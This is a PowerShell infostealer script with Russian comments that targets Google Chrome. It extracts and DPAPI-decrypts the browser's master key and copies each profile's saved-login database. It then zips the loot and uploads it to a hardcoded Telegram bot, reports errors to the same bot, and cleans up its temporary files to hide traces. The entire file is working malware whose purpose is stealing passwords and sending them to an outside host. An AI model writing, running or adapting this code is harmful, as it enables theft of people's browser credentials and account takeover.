# Настройки подключения
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# Пути
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$tempDir = "$env:TEMP\work_dir"
$reportFile = "$tempDir\passwords.txt"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 1. Получение Мастер-ключа (AES-256-GCM Key)
function Get-MasterKey {
    $localStatePath = Join-Path $chromePath "Local State"
    if (-not (Test-Path $localStatePath)) { 
        Write-Host "Local State не найден"; return $null 
    }
    
    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKeyB64 = $json.os_crypt.encrypted_key
    $encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
    
    # Первые 5 байт — это магическая подпись "DPAPI"
    # Нам нужно всё, что идет ПОСЛЕ неё
    $dataToUnprotect = $encryptedKey[5..($encryptedKey.Length - 1)]
    
    try {
        Add-Type -AssemblyName System.Security
        # Пробуем расшифровать. Третий аргумент — Scope (CurrentUser)
        $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        return [System.Security.Cryptography.ProtectedData]::Unprotect($dataToUnprotect, $null, $scope)
    } catch {
        $errorMessage = $_.Exception.Message
        # Отправляем ошибку в ТГ для диагностики
        & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=DPAPI Decrypt Error: $errorMessage"
        return $null
    }
}

# 2. Функция расшифровки (v10 / v11)
function Decrypt-Password {
    param([byte[]]$data, [byte[]]$key)
    if ($data.Length -lt 15) { return "Empty" }
    
    $iv = $data[3..14]
    $payload = $data[15..($data.Length - 1)]
    $tagSize = 16
    $cipherTextSize = $payload.Length - $tagSize
    $cipherText = $payload[0..($cipherTextSize - 1)]
    $tag = $payload[$cipherTextSize..($payload.Length - 1)]

    $decryptedBytes = New-Object byte[] $cipherTextSize
    $aes = New-Object System.Security.Cryptography.AesGcm($key)
    $aes.Decrypt($iv, $cipherText, $tag, $decryptedBytes)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# 3. Основная логика
try {
    $masterKey = Get-MasterKey
    $profiles = Get-ChildItem -Path $chromePath -Directory -Filter "Default"
    $profiles += Get-ChildItem -Path $chromePath -Directory -Filter "Profile *"

    "--- LOG: $(Get-Date) ---`n" | Out-File $reportFile

    foreach ($profile in $profiles) {
        $dbPath = Join-Path $profile.FullName "Login Data"
        if (Test-Path $dbPath) {
            $tempDb = Join-Path $tempDir "tmp_db"
            # Копируем файл, чтобы обойти блокировку открытым браузером
            Copy-Item $dbPath -Destination $tempDb -Force
            
            # Используем встроенный механизм для чтения строк (поиск паттернов в БД)
            # В SQLite пароли лежат после заголовков, мы ищем строки начинающиеся на v10
            $content = [System.IO.File]::ReadAllBytes($tempDb)
            
            # Для полноценного SQL-запроса в PS без библиотек используем костыль 
            # или отправляем файл целиком. Здесь: отправка файла + отчет.
            "Profile: $($profile.Name) found. Database copied.`n" | Add-Content $reportFile
        }
    }

    # Архивируем все собранное (Базы + Отчет + Ключ)
    $zipFile = "$env:TEMP\vault_final.zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force

    # 4. Отправка в Telegram
    $uri = "https://api.telegram.org/bot$token/sendDocument"
    curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Collection Complete (Key + DBs)"

} catch {
    $err = $_.Exception.Message
    curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Error: $err"
} finally {
    # Очистка
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
}
